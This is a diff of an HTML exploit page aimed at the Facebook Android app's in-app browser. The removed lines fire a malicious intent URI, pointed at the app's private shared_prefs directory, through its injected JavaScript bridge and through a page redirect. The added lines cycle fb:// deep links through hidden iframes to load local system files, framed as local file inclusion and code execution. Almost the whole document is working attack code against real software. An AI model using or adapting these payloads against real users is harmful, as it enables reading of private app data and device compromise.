@@ -2,63 +2,55 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSI Intent Hijack ACE</title>
+    <title>FB Deep Link LFI/ACE</title>
 </head>
-<body style="background:#000; color:#0ff; font-family:monospace;">
-    <h3>Fuzzing Bridge Routing Logic...</h3>
-    <div id="log">Awaiting bridge injection...</div>
+<body style="background:#000; color:#0f0; font-family:monospace;">
+    <h3>Snipping Internal FB Deep Links...</h3>
+    <div id="log">Testing routes...</div>
 
     <script>
         const logEl = document.getElementById('log');
-        const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
 
-        // A malicious Intent URI designed to force the app to open a local file
-        // or trigger a component crash if parsed by the Android ActivityManager
-        const maliciousIntent = "intent://Pwned#Intent;scheme=fb;package=com.facebook.katana;S.browser_uri=file:///data/data/com.facebook.katana/shared_prefs/;end";
+        // We use a universal Android system file to prove Local File Inclusion
+        const targetFile = "file:///system/etc/hosts";
 
-        // Common high-privileged bridge actions we want to blind-test
-        const targetActions = [
-            "open_url",
-            "launch_app",
-            "handle_intent",
-            "process_payment",
-            "share_to_story",
-            "deep_link",
-            "navigate"
+        // A list of historically vulnerable FB internal routing schemas
+        const deepLinks = [
+            `fb://faceweb/f?href=${targetFile}`,
+            `fb://browser?url=${targetFile}`,
+            `fb://webview?url=${targetFile}`,
+            `fb://native_post?href=${targetFile}`,
+            `fb://notification_settings?browser_uri=${targetFile}`,
+            `fb://page_browser?url=${targetFile}`,
+            `fb://canvas?url=${targetFile}`
         ];
 
-        function log(msg) { logEl.innerHTML += msg + "<br>"; }
+        let currentIndex = 0;
 
-        function fireIntentSniper() {
-            if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                log("<span style='color:red;'>[*] Bridge active. Firing Intent URIs...</span>");
-                
-                let bridge = window.__call_iabjs_unified_bridge;
-
-                // 1. Attack the Bridge Actions directly
-                for (let action of targetActions) {
-                    try {
-                        let payload = JSON.stringify({ url: maliciousIntent, uri: maliciousIntent, link: maliciousIntent });
-                        bridge(action, uuid, payload);
-                    } catch(e) {}
-                }
-
-                // 2. Attack the top-level Window location
-                // Sometimes the C++ URL override handler catches this and fails to sanitize it
-                setTimeout(() => {
-                    window.location.href = maliciousIntent;
-                }, 1000);
+        function fireNextLink() {
+            if (currentIndex >= deepLinks.length) {
+                logEl.innerHTML += "<br>[*] Payload cycle complete.";
+                return;
             }
+
+            let link = deepLinks[currentIndex];
+            logEl.innerHTML += `<br>[*] Firing: ${link}`;
+            
+            // We use an invisible iframe to fire the deep links without
+            // destroying our main execution context
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = link;
+            document.body.appendChild(iframe);
+
+            currentIndex++;
+            
+            // Fire the next link after 800ms
+            setTimeout(fireNextLink, 800);
         }
 
-        // Wait for Facebook to inject the bridge, then fire
-        let check = setInterval(() => {
-            if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                clearInterval(check);
-                fireIntentSniper();
-            }
-        }, 100);
-
+        // Delay start to ensure the page is fully loaded in the IAB
+        setTimeout(fireNextLink, 1000);
     </script>
 </body>
 </html>
